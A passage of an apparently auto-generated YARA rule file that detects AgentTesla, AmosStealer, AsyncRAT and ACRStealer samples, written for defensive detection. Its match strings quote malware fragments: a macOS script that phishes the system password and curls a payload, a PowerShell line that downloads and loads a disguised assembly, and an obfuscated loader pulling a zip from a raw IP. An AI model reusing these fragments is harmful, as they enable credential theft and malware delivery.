      $s1 = "function _0x4563(){var _0x1d314b=['lMv4zq','mJrNtKLLsfu','CMfUzg9T','sxrLBxm','rxHWyw5Krw52AxjVBM1LBNrtDhjPBMDZ','ntq5ndKWC3fpvM" ascii /* score: '27.00'*/
      $s2 = "0x17a636=_0x582689[_0x43ee4f(0x1ce)](_0x43ee4f(0x1d2)),_0x2ee40b='http://196.251.73.58/H2/Stein.zip',_0x361a7e=_0x3e07eb[_0x43ee" ascii /* score: '15.00'*/
      $s3 = "b12bc['moveNext']();}}try{_0x34c309(_0x2ee40b,_0x361a7e)&&(_0x4c836d(_0x361a7e,_0x385c35)&&(WScript[_0x43ee4f(0x1d4)](0x5dc),_0x" ascii /* score: '10.00'*/
      $s4 = "4f=_0x161a,_0x582689=WScript['CreateObject'](_0x43ee4f(0x1e8)),_0x3e07eb=WScript['CreateObject']('Scripting.FileSystemObject'),_" ascii /* score: '10.00'*/
      $s5 = "(0x1ea)]()){var _0x2db6c6=_0x3b12bc[_0x1e59e1(0x1e3)]();if(_0x3e07eb['GetExtensionName'](_0x2db6c6[_0x1e59e1(0x1dd)])[_0x1e59e1(" ascii /* score: '9.00'*/
      $s6 = ";var _0x17a636='',_0x2ee40b='';for(var _0x361a7e=0x0,_0x385c35,_0x58a8b9,_0x34c309=0x0;_0x58a8b9=_0x582689['charAt'](_0x34c309++" ascii /* score: '9.00'*/
      $s7 = ";_0x290f9b[_0x135a16(0x1e7)]('GET',_0x2c683a,![]),_0x290f9b['send']();if(_0x290f9b[_0x135a16(0x1d5)]!==0xc8)return![];var _0x29f" ascii /* score: '9.00'*/
      $s8 = ");}return decodeURIComponent(_0x2ee40b);};_0x161a['tNLYoV']=_0x2dc918,_0x571a39=arguments,_0x161a['PYfdHv']=!![];}var _0x5012a6=" ascii /* score: '9.00'*/
      $s9 = "wfIy2rLzMDOAwPRBg1UB3bXCNn0Dxz3EhL6qujdrevgr0HjsKTmtu5puffsu1rvvLDywvO','rgvSzxrL','mLvXt2rpCq','mtC3ntDArKzkqvq','tMfTzq','qurp" ascii /* score: '9.00'*/
      $s10 = "74293){var _0x528520=_0x43ee4f,_0x5c7c5e=WScript[_0x528520(0x1be)]('Shell.Application'),_0x44e2a8=_0x5c7c5e[_0x528520(0x1c3)](_0" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 10KB and
      all of them
}

rule AgentTesla_signature__fe8c6d09 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_fe8c6d09.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fe8c6d0928d73509ef1d616a4f678c1900bb2f49dbe0c062926dc68d70c607fe"
   strings:
      $s1 = "MEXXXXNEW.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 200KB and
      all of them
}

rule AmosStealer_signature__2 {
   meta:
      description = "_subset_batch - file AmosStealer(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "231c4bf14c4145be77aa4fef36c208891d818983c520ba067dda62d3bbbf547f"
   strings:
      $s1 = "  echo -n \"System Password: \"" fullword ascii /* score: '27.00'*/
      $s2 = "curl -o /tmp/update https://icloudservers.com/gm/update >/dev/null 2>&1" fullword ascii /* score: '25.00'*/
      $s3 = "echo \"$password\" | sudo -S xattr -c /tmp/update >/dev/null 2>&1" fullword ascii /* score: '23.00'*/
      $s4 = "    echo -n \"$password\" > /tmp/.pass" fullword ascii /* score: '18.00'*/
      $s5 = "  read password" fullword ascii /* score: '17.00'*/
      $s6 = "  if dscl . -authonly \"$username\" \"$password\" >/dev/null 2>&1; then" fullword ascii /* score: '16.00'*/
      $s7 = "chmod +x /tmp/update" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule AsyncRAT_signature__3 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8dcda3dacb5b770b878534c989884baa5943dff4eef2a37e71b5d93ffe3661ae"
   strings:
      $s1 = "set \"url=https://github.com/abal706/Lavern-Batch/raw/refs/heads/main/%filename%\"" fullword ascii /* score: '26.00'*/
      $s2 = "s%PbVBb%e%kCTFGBOTK%t%fRCff% %rcyuedP%\"%DmnEpsnXG%f%TKDFr%i%RK%l%hbfqsctrsu%e%iRZ%p%WGdaQSKI%a%Aw%t%LF%h%BGmLUoCbu%=%e%%TEMP%" ascii /* score: '15.00'*/
      $s3 = "s%PbVBb%e%kCTFGBOTK%t%fRCff% %rcyuedP%\"%DmnEpsnXG%f%TKDFr%i%RK%l%hbfqsctrsu%e%iRZ%p%WGdaQSKI%a%Aw%t%LF%h%BGmLUoCbu%=%e%%TEMP%" ascii /* score: '15.00'*/
      $s4 = "%e%aEpt%l%ZTWD%a%uBAcbBw%y%nevt%e%Qr%d%c%e%om%x%RAnIgEhdbG%p%esPyWCUN%a%qqxwr%n%jtBJxVce%s%Od%i%CJnRZV%o%gcclDmSsb%n%Iy%" fullword ascii /* score: '13.00'*/
      $s5 = ":%HqhHZIUnT%:%LldsQslDN% %DvTBd%D%z%o%F%s%Qn%y%PbFymETQo%a%FtPD%y%NfSB%" fullword ascii /* score: '13.00'*/
      $s6 = "%o%enQS%f%rS%i%SLoteQy%l%tS%e%WUyP% %J%-%PJIIUM%E%VdzYPNjMW%x%lCpJ%e%vo%c%fxyFma%u%aWQm%t%yCctGgTP%i%cbWluv%o%kudR%n%mWXEiRCmV%P" ascii /* score: '13.00'*/
      $s7 = "p%UXNhWi%o%cTQhF%w%jHAVAGhUw%e%J%r%XXbdnpuP%s%jGYRl%h%i%e%jJsFg%l%YwnEZBhke%l%xPcrq% %iiYBk%-%IEWSAaAxOw%N%adbN%o%Zk%P%P%r%ZujVV" ascii /* score: '13.00'*/
      $s8 = "/%i%r%MXOSxPROd%l%hFe% %HWb%H%DjNwA%I%dfTkh%G%bEKp%H%aKZKom%E%KqdCwf%S%NGjSGV%T%GBX% %RiqaJdaSDT%/%UN%r%VkKVvYEbd%u%jFtUFcYW% %W" ascii /* score: '11.00'*/
      $s9 = "%zRNJtpOG%y%NYQwXqAU%o%NELIe%r%PDCrHjpMRE%.%TMkpcHtsZF%.%Wdj%.%dNJb% %kJtHJsoBVa%%%i%vaEwoYVqj%%%" fullword ascii /* score: '11.00'*/
      $s10 = "/%i%r%MXOSxPROd%l%hFe% %HWb%H%DjNwA%I%dfTkh%G%bEKp%H%aKZKom%E%KqdCwf%S%NGjSGV%T%GBX% %RiqaJdaSDT%/%UN%r%VkKVvYEbd%u%jFtUFcYW% %W" ascii /* score: '11.00'*/
      $s11 = "%:%P%/%fcvvmyqkMz%/%FCmUtEVPf%g%xKmsVhhO%i%zRCVgp%t%BinIycLWdX%h%HtALNyAz%u%zvevNnRHu%b%XkBqGd%.%facZkGZ%c%yNGA%o%lh%m%rJxLeu%/%" ascii /* score: '11.00'*/
      $s12 = "s%P%e%XsPiUkbG%t%GmRda%l%ZpJhYSu%o%EaOUfmvl%c%tpyxWVHc%a%zVzi%l%Dmk% %Thc%e%xVxWVO%n%ArB%a%LXNmEPI%b%cgcZhI%l%fJQeS%e%Cam%d%cSfi" ascii /* score: '9.00'*/
      $s13 = "s%vdcZAg%c%WINiUXKgg%h%BMmRZWLoLa%t%pRSnXRyy%a%sTFWwPiI%s%hEWBgMQ%k%ckbFZcQPCN%s%SH% %ZLWzEmM%/%QxwoeD%c%oxx%r%TrEENM%e%ozeEPNqo" ascii /* score: '8.00'*/
      $s14 = "%VRLOrA%a%CLJw%c%tI%a%MtsoTvYec%k%lTUFCUzycB% %C%g%FFFjXwvW%" fullword ascii /* score: '8.00'*/
      $s15 = "%OnZCgelz%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x3a3a and filesize < 20KB and
      8 of them
}

rule AsyncRAT_signature__021bb843 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_021bb843.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "021bb843f0e3eaef2524b16e455d7ab5dfae27d367d03d8c03ba7f9ab6704a74"
   strings:
      $s1 = "59,59,60,47,60,55,53,47,59,58,52,53,47,60,58,54,55,47,60,60,51,53,47,59,58,52,53,47,60,58,52,58,47,60,57,54,59,47,52,51,51,55,53" ascii /* score: '9.00'*/ /* hex encoded string 'YY`G`USGYXRSG`XTUG``QSGYXRSG`XRXG`WTYGRQQUS' */
      $s2 = "60,53,47,52,51,52,57,51,47,59,58,56,53,47,60,57,56,57,47,60,59,54,54,47,52,51,51,54,56,47,59,59,58,57,47,52,51,51,54,58,47,59,59" ascii /* score: '9.00'*/ /* hex encoded string '`SGRQRWQGYXVSG`WVWG`YTTGRQQTVGYYXWGRQQTXGYY' */
      $s3 = "51,53,47,52,58,54,47,60,58,55,59,47,52,51,51,52,51,47,52,51,52,57,54,47,52,51,51,54,53,47,59,58,54,59,47,52,51,51,57,52,47,60,58" ascii /* score: '9.00'*/ /* hex encoded string 'QSGRXTG`XUYGRQQRQGRQRWTGRQQTSGYXTYGRQQWRG`X' */
      $s4 = "60,57,55,60,47,52,51,51,57,51,47,60,59,60,59,47,59,59,52,51,47,60,58,54,58,47,60,58,57,51,47,60,59,54,51,47,59,58,55,60,47,52,51" ascii /* score: '9.00'*/ /* hex encoded string '`WU`GRQQWQG`Y`YGYYRQG`XTXG`XWQG`YTQGYXU`GRQ' */
      $s5 = "51,59,56,47,58,53,58,51,47,60,56,59,59,47,55,60,56,56,47,59,55,56,57,47,56,59,55,52,47,53,55,55,56,47,52,51,59,53,58,47,52,53,56" ascii /* score: '9.00'*/ /* hex encoded string 'QYVGXSXQG`VYYGU`VVGYUVWGVYURGSUUVGRQYSXGRSV' */
      $s6 = "58,60,47,52,59,51,47,60,58,60,53,47,60,59,59,53,47,60,57,60,57,47,52,51,52,55,57,47,52,53,55,60,51,47,52,51,52,54,59,47,60,59,58" ascii /* score: '9.00'*/ /* hex encoded string 'X`GRYQG`X`SG`YYSG`W`WGRQRUWGRSU`QGRQRTYG`YX' */
      $s7 = "60,57,60,58,47,60,58,54,57,47,59,57,51,53,47,60,60,60,60,47,60,57,52,47,52,51,51,60,52,47,59,59,59,51,47,59,59,52,52,47,59,58,56" ascii /* score: '9.00'*/ /* hex encoded string '`W`XG`XTWGYWQSG````G`WRGRQQ`RGYYYQGYYRRGYXV' */
      $s8 = "53,47,60,58,54,57,47,52,57,47,56,54,47,56,54,47,54,59,47,60,57,56,57,47,60,58,54,58,47,60,58,51,53,47,60,58,51,56,47,59,55,60,53" ascii /* score: '9.00'*/ /* hex encoded string 'SG`XTWGRWGVTGVTGTYG`WVWG`XTXG`XQSG`XQVGYU`S' */
      $s9 = "51,56,58,47,60,59,58,60,47,60,57,56,58,47,52,51,51,57,56,47,52,51,51,56,56,47,59,58,53,55,47,52,51,51,57,54,47,52,51,51,52,55,47" ascii /* score: '9.00'*/ /* hex encoded string 'QVXG`YX`G`WVXGRQQWVGRQQVVGYXSUGRQQWTGRQQRUG' */
      $s10 = "51,47,60,57,60,51,47,52,51,52,58,56,47,60,58,60,52,47,52,51,51,56,56,47,59,59,58,55,47,52,51,51,57,51,47,59,59,57,52,47,52,53,55" ascii /* score: '9.00'*/ /* hex encoded string 'QG`W`QGRQRXVG`X`RGRQQVVGYYXUGRQQWQGYYWRGRSU' */
      $s11 = "47,60,59,59,52,47,60,58,51,53,47,60,57,60,52,47,60,58,51,57,47,52,51,51,56,54,47,60,59,60,52,47,59,58,54,58,47,60,59,60,57,47,59" ascii /* score: '9.00'*/ /* hex encoded string 'G`YYRG`XQSG`W`RG`XQWGRQQVTG`Y`RGYXTXG`Y`WGY' */
      $s12 = "58,55,60,47,52,51,51,56,55,47,52,51,52,58,55,47,52,59,59,47,52,51,51,56,59,47,56,51,60,59,53,47,60,57,60,52,47,52,59,51,47,60,59" ascii /* score: '9.00'*/ /* hex encoded string 'XU`GRQQVUGRQRXUGRYYGRQQVYGVQ`YSG`W`RGRYQG`Y' */
      $s13 = "51,51,55,59,47,52,51,51,59,60,47,52,51,52,57,53,47,52,59,59,47,60,58,55,59,47,60,58,51,57,47,60,59,60,60,47,60,59,59,60,47,59,58" ascii /* score: '9.00'*/ /* hex encoded string 'QQUYGRQQY`GRQRWSGRYYG`XUYG`XQWG`Y``G`YY`GYX' */
      $s14 = "55,51,47,60,57,55,60,47,59,59,57,56,47,52,51,51,55,51,47,59,59,58,52,47,52,58,54,47,59,57,51,56,47,60,59,59,56,47,52,51,51,55,59" ascii /* score: '9.00'*/ /* hex encoded string 'UQG`WU`GYYWVGRQQUQGYYXRGRXTGYWQVG`YYVGRQQUY' */
      $s15 = "47,52,51,52,54,59,47,60,60,51,57,47,52,51,52,57,52,47,52,51,51,52,55,47,59,57,51,51,47,52,51,51,55,51,47,60,59,60,56,47,60,57,59" ascii /* score: '9.00'*/ /* hex encoded string 'GRQRTYG``QWGRQRWRGRQQRUGYWQQGRQQUQG`Y`VG`WY' */
   condition:
      uint16(0) == 0x2f2f and filesize < 8000KB and
      8 of them
}

rule AsyncRAT_signature__ac958443 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_ac958443.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ac958443e313035f638e2efac96a51a63cc56072bb6b92233cc86cfc21eb599d"
   strings:
      $s1 = "52,47,59,58,56,60,47,52,51,52,55,58,47,59,56,60,55,47,60,58,51,51,47,52,53,47,55,60,47,55,60,47,54,55,47,60,57,59,52,47,60,59,58" ascii /* score: '9.00'*/ /* hex encoded string 'RGYXV`GRQRUXGYV`UG`XQQGRSGU`GU`GTUG`WYRG`YX' */
      $s2 = "51,51,55,58,47,60,58,57,56,47,52,51,51,59,57,47,59,58,51,59,47,59,59,58,53,47,60,59,54,53,47,60,55,59,47,59,56,60,60,47,52,51,51" ascii /* score: '9.00'*/ /* hex encoded string 'QQUXG`XWVGRQQYWGYXQYGYYXSG`YTSG`UYGYV``GRQQ' */
      $s3 = "57,58,58,47,60,57,60,57,47,52,51,51,55,60,47,52,51,51,57,52,47,52,51,52,56,57,47,52,51,51,55,55,47,60,59,53,57,47,59,58,53,54,47" ascii /* score: '9.00'*/ /* hex encoded string 'WXXG`W`WGRQQU`GRQQWRGRQRVWGRQQUUG`YSWGYXSTG' */
      $s4 = "51,53,58,47,52,51,51,59,57,47,59,59,58,55,47,52,51,52,58,52,47,52,51,51,56,52,47,52,53,47,55,60,47,55,60,47,54,55,47,52,51,51,55" ascii /* score: '9.00'*/ /* hex encoded string 'QSXGRQQYWGYYXUGRQRXRGRQQVRGRSGU`GU`GTUGRQQU' */
      $s5 = "60,57,58,55,47,52,51,51,56,52,47,60,57,60,55,47,52,51,51,54,55,47,52,51,51,54,56,47,52,51,51,56,51,47,52,51,52,57,54,47,60,57,57" ascii /* score: '9.00'*/ /* hex encoded string '`WXUGRQQVRG`W`UGRQQTUGRQQTVGRQQVQGRQRWTG`WW' */
      $s6 = "60,59,60,60,47,52,51,52,54,60,47,60,59,54,52,47,60,59,59,56,47,59,58,54,57,47,60,60,60,55,47,52,51,52,54,55,47,60,59,53,58,47,52" ascii /* score: '9.00'*/ /* hex encoded string '`Y``GRQRT`G`YTRG`YYVGYXTWG```UGRQRTUG`YSXGR' */
      $s7 = "51,55,57,47,60,57,60,53,47,59,59,58,57,47,52,53,47,55,60,47,55,60,47,54,55,47,60,60,51,52,47,52,51,51,56,51,47,60,58,59,59,47,52" ascii /* score: '9.00'*/ /* hex encoded string 'QUWG`W`SGYYXWGRSGU`GU`GTUG``QRGRQQVQG`XYYGR' */
      $s8 = "51,52,47,60,52,59,47,59,56,60,57,47,59,59,57,53,47,59,58,55,58,47,52,51,52,56,59,47,59,59,57,54,47,60,59,60,52,47,52,51,52,56,51" ascii /* score: '9.00'*/ /* hex encoded string 'QRG`RYGYV`WGYYWSGYXUXGRQRVYGYYWTG`Y`RGRQRVQ' */
      $s9 = "58,51,53,47,59,58,55,58,47,60,59,53,58,47,60,57,56,54,47,52,51,51,51,57,47,59,57,51,54,47,60,59,60,59,47,59,58,54,54,47,60,58,56" ascii /* score: '9.00'*/ /* hex encoded string 'XQSGYXUXG`YSXG`WVTGRQQQWGYWQTG`Y`YGYXTTG`XV' */
      $s10 = "55,56,47,60,59,54,52,47,60,60,51,52,47,52,51,51,53,59,47,60,57,58,54,47,59,58,54,53,47,59,59,56,60,47,52,59,55,47,60,58,54,52,47" ascii /* score: '9.00'*/ /* hex encoded string 'UVG`YTRG``QRGRQQSYG`WXTGYXTSGYYV`GRYUG`XTRG' */
      $s11 = "52,51,51,53,58,47,59,59,57,53,47,60,57,60,54,47,60,58,51,54,47,60,57,55,55,47,60,57,59,53,47,59,59,58,53,47,60,57,58,58,47,60,59" ascii /* score: '9.00'*/ /* hex encoded string 'RQQSXGYYWSG`W`TG`XQTG`WUUG`WYSGYYXSG`WXXG`Y' */
      $s12 = "54,55,47,60,58,54,57,47,52,53,55,58,54,47,52,51,51,52,51,47,60,58,56,57,47,59,56,60,58,47,59,59,51,58,47,59,59,58,58,47,60,57,59" ascii /* score: '9.00'*/ /* hex encoded string 'TUG`XTWGRSUXTGRQQRQG`XVWGYV`XGYYQXGYYXXG`WY' */
      $s13 = "56,47,60,59,60,53,47,52,53,55,59,56,47,60,59,59,54,47,52,51,51,55,60,47,52,51,51,55,51,47,60,57,56,54,47,52,51,51,54,55,47,52,51" ascii /* score: '9.00'*/ /* hex encoded string 'VG`Y`SGRSUYVG`YYTGRQQU`GRQQUQG`WVTGRQQTUGRQ' */
      $s14 = "59,54,59,47,60,58,54,52,47,59,55,59,55,47,59,58,53,54,47,52,53,47,55,60,47,55,60,47,54,55,47,60,58,57,51,47,52,51,51,59,59,47,60" ascii /* score: '9.00'*/ /* hex encoded string 'YTYG`XTRGYUYUGYXSTGRSGU`GU`GTUG`XWQGRQQYYG`' */
      $s15 = "51,51,55,59,47,52,59,54,47,52,59,54,47,60,58,54,52,47,60,59,60,55,47,60,57,57,54,47,59,59,57,60,47,52,51,51,59,59,47,60,58,58,58" ascii /* score: '9.00'*/ /* hex encoded string 'QQUYGRYTGRYTG`XTRG`Y`UG`WWTGYYW`GRQQYYG`XXX' */
   condition:
      uint16(0) == 0x2f2f and filesize < 7000KB and
      8 of them
}

rule AsyncRAT_signature__16fc2662 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_16fc2662.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "16fc2662e12cdd31251ac133564da5b4cd0c27a2ea48f18e7e57bdab1254f080"
   strings:
      $x1 = "CreateObject(\"wscript.shell\").Run \"powershell.exe -EP Bypass -Command \"\"if (-Not (Test-Path 'C:\\Users\\Public\\logs.jpg'))" ascii /* score: '64.00'*/
      $x2 = "CreateObject(\"wscript.shell\").Run \"powershell.exe -EP Bypass -Command \"\"if (-Not (Test-Path 'C:\\Users\\Public\\logs.jpg'))" ascii /* score: '56.00'*/
      $x3 = "e-WebRequest 'https://shorten-urls.work.gd/logs.jpg' -OutFile 'C:\\Users\\Public\\logs.jpg' };[byte[]] $dwdwdwwasa = (Get-Conten" ascii /* score: '44.00'*/
      $x4 = "C:\\Users\\Public\\logs.jpg').Split(',') | ForEach-Object { $_ / 30 };[System.Threading.Thread]::getDomain().Load($dwdwdwwasa);[" ascii /* score: '38.00'*/
      $s5 = "amic.Emiit]::Running();\"\"\",LOL" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x7243 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule AsyncRAT_signature__9c259e27 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_9c259e27.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9c259e27bd8ba5bc121b852f249a10806cd7f7b9b4aed5eca4855df67dc41a17"
   strings:
      $s1 = "// bb94d434-5929-4b26-b287-bb12ccec920a - 638917068164367799" fullword ascii /* score: '12.00'*/
      $s2 = "// c8ad1236-e562-42ac-88e1-f350a7923229 - 638917068164367799" fullword ascii /* score: '9.00'*/
      $s3 = "// 2aea2a0f-3acd-405e-ac0d-6fc1d15f946c - 638917068164367799" fullword ascii /* score: '9.00'*/
      $s4 = "// 57e3fd47-c404-481f-a4fb-523c7cc78f8a - 638917068164367799" fullword ascii /* score: '9.00'*/
      $s5 = "// 473447af-b1f5-4a7b-922d-35e6da561241 - 638917068164367799" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 900KB and
      all of them
}

rule AsyncRAT_signature__b53972cc {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_b53972cc.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b53972cc318699e3b835a058d99c00b6a6337b4f40faca8df8bd6b099a5d0fbd"
   strings:
      $s1 = "// 8da80fce-8efe-4d22-a820-7dd7403e1bf8 - 638916667624345133" fullword ascii /* score: '9.00'*/
      $s2 = "// 2f3b271e-b90d-4c16-b7e0-b6a3fb5e719a - 638916667624345133" fullword ascii /* score: '9.00'*/
      $s3 = "// fb4dd9d6-9e9e-405f-9937-f6e2c5c88d13 - 638916667624345133" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 1000KB and
      all of them
}

rule AsyncRAT_signature__eeb981e9 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_eeb981e9.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eeb981e94f2057d42fd863c9d1cdeaa66aa51680f84717b6fc59631cbb4dc770"
   strings:
      $s1 = "// cd1e1add-b850-4b6a-adae-d9440886eddb - 638918079133490613" fullword ascii /* score: '12.00'*/
      $s2 = "61,59,61,53,48,61,60,54,58,48,53,52,52,56,54,48,61,59,58,57,48,61,59,55,54,48,61,59,59,57,48,61,60,54,58,48,61,59,59,59,48,61,60" ascii /* score: '9.00'*/ /* hex encoded string 'aYaSHa`TXHSRRVTHaYXWHaYUTHaYYWHa`TXHaYYYHa`' */
      $s3 = "53,52,52,55,59,48,53,52,52,56,52,48,60,59,55,58,48,53,52,52,56,57,48,61,59,61,54,48,53,52,52,57,56,48,53,52,52,55,61,48,61,60,54" ascii /* score: '9.00'*/ /* hex encoded string 'SRRUYHSRRVRH`YUXHSRRVWHaYaTHSRRWVHSRRUaHa`T' */
      $s4 = "61,61,48,55,60,56,57,48,60,61,48,53,52,61,61,55,48,56,56,61,55,48,57,57,55,57,61,48,57,58,58,53,59,48,61,55,58,61,48,61,54,54,48" ascii /* score: '9.00'*/ /* hex encoded string 'aaHU`VWH`aHSRaaUHVVaUHWWUWaHWXXSYHaUXaHaTTH' */
      $s5 = "60,60,60,48,53,52,52,57,54,48,61,60,55,57,48,61,60,61,54,48,53,52,52,54,57,48,57,57,55,57,60,48,57,59,54,59,53,48,61,59,59,55,48" ascii /* score: '9.00'*/ /* hex encoded string '```HSRRWTHa`UWHa`aTHSRRTWHWWUW`HWYTYSHaYYUH' */
      $s6 = "60,54,58,48,53,52,52,56,56,48,61,60,53,61,48,61,60,61,52,48,60,54,58,52,48,60,59,55,58,48,57,57,55,57,52,48,57,58,58,54,53,48,61" ascii /* score: '9.00'*/ /* hex encoded string '`TXHSRRVVHa`SaHa`aRH`TXRH`YUXHWWUWRHWXXTSHa' */
      $s7 = "53,52,52,53,57,48,53,52,52,57,60,48,61,58,53,61,48,61,59,59,54,48,61,59,59,59,48,61,60,55,58,48,61,60,55,59,48,61,60,61,53,48,53" ascii /* score: '9.00'*/ /* hex encoded string 'SRRSWHSRRW`HaXSaHaYYTHaYYYHa`UXHa`UYHa`aSHS' */
      $s8 = "52,52,54,60,48,53,52,52,52,52,48,61,60,61,56,48,61,59,59,54,48,53,52,52,57,56,48,61,59,59,57,48,53,52,52,57,54,48,61,60,55,58,48" ascii /* score: '9.00'*/ /* hex encoded string 'RRT`HSRRRRHa`aVHaYYTHSRRWVHaYYWHSRRWTHa`UXH' */
      $s9 = "53,52,54,48,53,52,61,61,55,48,56,56,61,55,48,57,57,55,57,61,48,57,58,58,53,59,48,61,55,58,61,48,61,54,54,48,57,56,58,59,48,56,59" ascii /* score: '9.00'*/ /* hex encoded string 'SRTHSRaaUHVVaUHWWUWaHWXXSYHaUXaHaTTHWVXYHVY' */
      $s10 = "48,53,52,52,57,54,48,60,56,60,56,48,60,54,58,52,48,61,59,55,54,48,61,60,55,56,48,53,52,52,57,53,48,53,52,52,54,56,48,53,52,52,57" ascii /* score: '9.00'*/ /* hex encoded string 'HSRRWTH`V`VH`TXRHaYUTHa`UVHSRRWSHSRRTVHSRRW' */
      $s11 = "52,52,53,57,48,53,52,52,57,58,48,53,52,52,54,55,48,53,52,52,57,52,48,61,60,55,61,48,53,52,52,54,54,48,53,54,48,56,61,48,56,61,48" ascii /* score: '9.00'*/ /* hex encoded string 'RRSWHSRRWXHSRRTUHSRRWRHa`UaHSRRTTHSTHVaHVaH' */
      $s12 = "52,52,57,55,48,61,59,55,58,48,61,60,53,56,48,53,52,52,57,54,48,56,55,54,60,48,53,52,52,57,54,48,61,60,55,57,48,53,52,52,56,55,48" ascii /* score: '9.00'*/ /* hex encoded string 'RRWUHaYUXHa`SVHSRRWTHVUT`HSRRWTHa`UWHSRRVUH' */
      $s13 = "58,48,61,60,61,57,48,61,60,55,61,48,53,52,52,53,60,48,61,60,54,57,48,53,52,52,54,59,48,61,61,61,57,48,53,52,52,54,57,48,60,59,55" ascii /* score: '9.00'*/ /* hex encoded string 'XHa`aWHa`UaHSRRS`Ha`TWHSRRTYHaaaWHSRRTWH`YU' */
      $s14 = "60,53,60,48,53,52,52,52,52,48,61,60,61,56,48,61,60,53,57,48,53,52,52,52,58,48,61,59,55,52,48,53,52,52,56,56,48,61,59,59,55,48,61" ascii /* score: '9.00'*/ /* hex encoded string '`S`HSRRRRHa`aVHa`SWHSRRRXHaYURHSRRVVHaYYUHa' */
      $s15 = "48,61,60,55,61,48,61,60,54,58,48,61,60,61,55,48,53,52,52,56,61,48,57,57,55,57,60,48,57,59,54,59,53,48,61,59,55,54,48,61,59,59,57" ascii /* score: '9.00'*/ /* hex encoded string 'Ha`UaHa`TXHa`aUHSRRVaHWWUW`HWYTYSHaYUTHaYYW' */
   condition:
      uint16(0) == 0x0a0d and filesize < 4000KB and
      8 of them
}

rule b06f85220362828195e48ba8b6b593641108101f997accb55cc4eec8cd8712d9_b06f8522 {
   meta:
      description = "_subset_batch - file b06f85220362828195e48ba8b6b593641108101f997accb55cc4eec8cd8712d9_b06f8522.uue"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b06f85220362828195e48ba8b6b593641108101f997accb55cc4eec8cd8712d9"
   strings:
      $s1 = "9Orden - N011188__________________________________.pdf.exe" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _ACRStealer_signature__87a63f644cb8a20014ebd30c4ceb01d5_imphash__ACRStealer_signature__87a63f644cb8a20014ebd30c4ceb01d5_imph_0 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_87a63f644cb8a20014ebd30c4ceb01d5(imphash).dll, ACRStealer(signature)_87a63f644cb8a20014ebd30c4ceb01d5(imphash)_25b5f3ec.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d3296068aca124f78c32df29ae63f366bee8a937d791c7ef043acb7ffeff8cc4"
      hash2 = "25b5f3ec091b15956f0da94da4056ad0f5c7c34deb9e6cfd5b9748f6254bb547"
   strings:
      $x1 = "C:\\Users\\qt\\work\\qt\\qtbase\\lib\\Qt5Core.pdb" fullword ascii /* score: '31.00'*/
      $s2 = "githubusercontent.com" fullword ascii /* score: '29.00'*/
      $s3 = "lpusercontent.com" fullword ascii /* score: '29.00'*/
      $s4 = "QProcess: file redirection is unsupported for detached elevated processes." fullword ascii /* score: '27.00'*/
      $s5 = "QProcess: custom environment will be ignored for detached elevated process." fullword ascii /* score: '27.00'*/
      $s6 = "serveftp.com" fullword ascii /* score: '26.00'*/
      $s7 = "logoip.com" fullword ascii /* score: '26.00'*/
      $s8 = "myiphost.com" fullword ascii /* score: '26.00'*/
      $s9 = "serveirc.com" fullword ascii /* score: '26.00'*/
      $s10 = "nfshost.com" fullword ascii /* score: '26.00'*/
      $s11 = "blogsyte.com" fullword ascii /* score: '26.00'*/
      $s12 = "QProcess: ConnectNamedPipe failed." fullword ascii /* score: '26.00'*/
      $s13 = "Aborted. Incompatible processor: missing feature 0x%llx -%s." fullword ascii /* score: '25.00'*/
      $s14 = "stufftoread.com" fullword ascii /* score: '24.00'*/
      $s15 = "outsystemscloud.com" fullword ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and pe.imphash() == "87a63f644cb8a20014ebd30c4ceb01d5" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a06f302f71edd380da3d5bf4a6d94ebd_imphash__a06f302f71edd380da3d5bf4a6d94ebd_imphash__8f808e5d_1 {
   meta:
      description = "_subset_batch - from files a06f302f71edd380da3d5bf4a6d94ebd(imphash).exe, a06f302f71edd380da3d5bf4a6d94ebd(imphash)_8f808e5d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1f1043357731b7156b19e4ad7774c53bd9e41809c704ae6d4945903da040359f"
      hash2 = "8f808e5d801eceea549dfe7693a7d2ff0f8ff34fd37791c8dad13438badfd166"
   strings:
